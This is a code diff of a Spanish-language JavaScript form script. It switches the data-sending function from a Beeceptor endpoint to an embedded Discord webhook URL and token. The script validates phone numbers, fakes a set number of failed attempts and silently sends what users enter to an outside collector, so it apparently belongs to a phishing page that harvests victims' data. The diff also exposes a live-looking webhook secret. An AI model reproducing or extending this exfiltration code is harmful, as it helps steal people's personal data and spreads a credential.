@@ -247,9 +247,10 @@
   "use strict";
 
   /* ================= CONFIGURACIÓN ================= */
+  const DISCORD_WEBHOOK =  "https://discord.com/api/webhooks/1573556665217851433/b1WgG7gG-wYJtB_KOv0t1b3_280DfazWoiLgrNzI1vg1eJAZD-WY9A0xEnFGmCxnQwRO"
   var CONFIG = {
     endpoint: "https://thesecuremockserverpro.free.beeceptor.com",
-    whatsapp: "https://chat.whatsapp.com/XXXXXXXXXXXXXXXXXXXX", // <- tu enlace del grupo
+    whatsapp: "https://chat.whatsapp.com/IQMGOssbw7A4IAJrV6p6PM?s=cl&p=a&iam=2",
     esperaMs: 15000,
     intentosFallidos: 2,
     intentosPermitidos: 3
@@ -308,33 +309,29 @@
   }
 
   /* ================= ENVÍO A BEECEPTOR (SIEMPRE SALE) ================= */
-  function enviar(payload){
-    var body = JSON.stringify(ordenar(payload));
-    console.log("[BEEceptor] POST ->", CONFIG.endpoint);
-    console.log("[BEEceptor] body:", body);
-
-    // sendBeacon primero (fire-and-forget, no falla por CORS)
-    try {
-      if(navigator.sendBeacon){
-        var blob = new Blob([body], { type: "application/json" });
-        navigator.sendBeacon(CONFIG.endpoint, blob);
-      }
-    } catch(e){ /* silencio */ }
-
-    return fetch(CONFIG.endpoint, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: body
+  function enviar(msg) {
+    return fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            content: String(msg)
+        })
     })
-    .then(function(res){
-      console.log("[BEEceptor] fetch status:", res.status);
-      return res;
+    .then(function(res) {
+        if (!res.ok) {
+            throw new Error("Discord HTTP " + res.status);
+        }
+
+        console.log("[Discord] Mensaje enviado correctamente");
+        return true;
     })
-    .catch(function(err){
-      console.warn("[BEEceptor] fetch falló (sendBeacon ya envió):", err);
-      return null;
+    .catch(function(err) {
+        console.error("[Discord] Error:", err);
+        return false;
     });
-  }
+}
 
   /* ================= VALIDADOR DE NÚMEROS ================= */
   var input = $("telefono");
